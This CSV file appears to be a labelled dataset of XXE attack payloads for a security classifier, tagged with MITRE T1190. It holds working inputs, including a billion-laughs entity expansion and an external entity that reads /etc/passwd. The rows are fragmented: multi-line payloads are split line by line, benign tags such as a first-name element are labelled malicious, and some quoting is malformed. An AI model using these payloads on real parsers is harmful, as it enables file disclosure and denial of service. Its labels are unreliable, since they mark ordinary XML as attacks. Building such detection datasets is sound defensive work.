Payload,Signature,AttackType,Severity,MITRE,Label,Description
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<firstName>John</firstName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<lastName>Doe</lastName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!DOCTYPE replace [<!ENTITY example ""Doe""> ]>",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<firstName>John</firstName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<lastName>&example;</lastName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<firstName>John</firstName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<lastName>&ent;</lastName>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
</userInfo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!--?xml version=""1.0"" ?-->",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!DOCTYPE lolz [<!ENTITY lol ""lol""><!ELEMENT lolz (#PCDATA)>",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol1 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol2 ""&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol3 ""&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol4 ""&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol5 ""&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol6 ""&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol7 ""&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol8 ""&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<!ENTITY lol9 ""&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"">",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
]>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<tag>&lol9;</tag>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT foo (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT foo (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<foo><result>&ac;</result></foo>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
"<?xml version=""1.0""?>",XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
<!DOCTYPE foo [,XXE,XXE,Medium,T1190,Malicious,XXE payload from comprehensive dataset
<!ELEMENT foo (#ANY)>,XXE,XXE,Low,T1190,Malicious,XXE payload from comprehensive dataset
